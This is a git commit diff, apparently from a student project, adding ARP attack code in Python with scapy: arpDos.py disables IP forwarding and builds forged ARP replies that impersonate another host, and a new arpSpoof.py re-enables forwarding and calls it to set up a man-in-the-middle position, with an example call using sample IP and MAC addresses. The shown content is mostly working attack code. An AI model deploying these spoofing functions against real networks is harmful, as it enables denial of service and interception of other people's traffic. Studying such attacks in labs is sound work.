0e178f29efe0631d88baad6b2dc537cc628129a5
George Hughey <ghughey@umd.edu>
2016-10-18 15:54:04 +0000

    Finished arp Spoofing

--- arpDos.py
+++ arpDos.py
@@ -1,12 +1,15 @@
 from scapy.all import *
 from scans import *
 import subprocess
+import os
 #masq_ip: ip we masquerade as.
 #masc_mac: Masqueraded mac address
 #source_mac: Our mac address
 #Dest IP: target ip
 #Dest Mac: target mac address
+#ex: arpDos("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")
 def arpDos(masq_ip, masq_mac, source_mac, dest_ip, dest_mac):
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     packet = ARP()
     packet.op = 2
     packet.psrc = masq_ip
---
+++ arpSpoof.py
@@ -0,0 +1,11 @@
+from arpDos import *
+import os
+#masq_ip: ip we masquerade as.
+#masc_mac: Masqueraded mac address
+#source_mac: Our mac address
+#Dest IP: target ip
+#Dest Mac: target mac address
+#ex: arpDos("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")
+def arpSpoof(masq_ip, masq_mac, source_mac, dest_ip, dest_mac):
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    arpDos(masq_ip, masq_mac, source_mac, dest_ip, dest_mac)
